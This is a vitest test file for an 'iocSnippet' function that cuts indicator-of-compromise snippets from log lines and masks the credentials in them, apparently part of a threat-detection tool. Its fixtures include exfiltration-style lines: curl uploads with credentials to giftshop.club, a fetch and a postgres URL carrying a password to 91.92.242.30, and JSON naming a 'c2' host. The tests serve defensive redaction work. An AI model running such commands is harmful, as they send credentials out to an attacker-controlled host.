import { describe, expect, it } from 'vitest';
import { iocSnippet } from './snippet.js';
import { domainBoundaryRegex, ipBoundaryRegex } from './boundary.js';

const SECRET = 'Zp9Yx8Wq7Vr6Ut5Sr4Qp3';
const pad = (s: string) => `${'x'.repeat(200)} ${s} ${'y'.repeat(200)}`;

describe('iocSnippet', () => {
  it.each([
    [`fetch("https://administrator-account:${SECRET}@91.92.242.30/x")`, ipBoundaryRegex('91.92.242.30')],
    [`"postgres://svc_reporting_readonly:${SECRET}@91.92.242.30:5432/db"`, ipBoundaryRegex('91.92.242.30')],
    [`curl -u deploy_automation_user:${SECRET} https://giftshop.club/up`, domainBoundaryRegex('giftshop.club')],
    [`{"db_password":"${SECRET}","f":"","c2":"91.92.242.30"}`, ipBoundaryRegex('91.92.242.30')],
    [`export DB_PASSWORD=${SECRET}; F=; curl http://91.92.242.30/x`, ipBoundaryRegex('91.92.242.30')],
  ])('masks the credential before cutting the window: %s', (line, re) => {
    const out = iocSnippet(pad(line), re);
    expect(out).not.toContain(SECRET);
    expect(out).toMatch(re);
  });
});

describe('iocSnippet — long lines', () => {
  it('stays fast on a long line of flag-shaped text and still masks around the match', () => {
    const line = '-p x '.repeat(160_000) + `curl -u deploy:${SECRET} https://giftshop.club/up ` + '-p x '.repeat(10_000);
    const start = Date.now();
    const out = iocSnippet(line, domainBoundaryRegex('giftshop.club'));
    // well under a second alone; a quadratic scan of this 800 KB line takes minutes, so the margin absorbs suite load
    expect(Date.now() - start).toBeLessThan(8_000);
    expect(out).toContain('giftshop.club');
    expect(out).not.toContain(SECRET);
  });
});

describe('iocSnippet — a long credential value before the match', () => {
  it('keeps the key: a value longer than any region is still masked', () => {
    const tokens = Array.from({ length: 150 }, (_, i) => `Qu${'7HXDpWxohhHipzznjEr'}${i}`).join(', ');
    const out = iocSnippet(`api_keys: [${tokens}] # c2 giftshop.club`, domainBoundaryRegex('giftshop.club'));
    expect(out).not.toMatch(/Qu7HXDpWxohhHipzznjEr\d/);
    const out2 = iocSnippet(`{"password":"${tokens.replace(/, /g, ' ')}","u":"http://91.92.242.30/x"}`, ipBoundaryRegex('91.92.242.30'));
    expect(out2).not.toMatch(/Qu7HXDpWxohhHipzznjEr\d/);
  });
});
